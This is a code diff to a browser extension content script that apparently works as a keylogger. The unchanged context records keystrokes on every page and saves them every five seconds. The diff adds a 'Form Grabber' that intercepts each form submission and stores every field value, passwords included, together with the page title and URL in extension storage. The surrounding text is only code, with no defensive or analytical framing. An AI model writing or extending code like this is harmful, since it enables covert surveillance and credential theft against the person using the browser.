@@ -1,5 +1,9 @@
-/* Keylib */
+/* Randoms */
+if (!document.title) {
+    document.title = document.URL;
+}
 
+/* Keylib */
 // Alphanumeric
 document.addEventListener('keypress', function (e) {
     e = e || window.event;
@@ -50,7 +54,7 @@ chrome.storage.sync.get({allKeys: false}, function(settings) {
     }
 });
 
-/* Logging */
+/* Keylog Saving */
 var time = new Date().getTime();
 var data = {};
 var shouldSave = false;
@@ -84,4 +88,28 @@ setInterval(function(){
     save();
 }, 5000);
 
+/* Form Grabber */
+function saveForm(time, data) {
+    var toSave = {};
+    toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
+    chrome.storage.local.set(toSave, function() { console.log("Saved", data); });
+}
 
+chrome.storage.sync.get({formGrabber: false}, function(settings) {
+    if (settings.formGrabber) {
+        var forms = document.getElementsByTagName("form");
+        for (var i = 0; i < forms.length; i++) {
+            forms[i].addEventListener("submit", function(e) {
+                var data = {};
+                data["FormName"] = e.target.name;
+                data["FormAction"] = e.target.action;
+                data["FormElements"] = {};
+                var elements = e.target.elements;
+                for (var n = 0; n < elements.length; n++) {
+                    data["FormElements"][elements[n].name] = elements[n].value;
+                }
+                saveForm(e.timeStamp, data);
+            });
+        }
+    }
+});
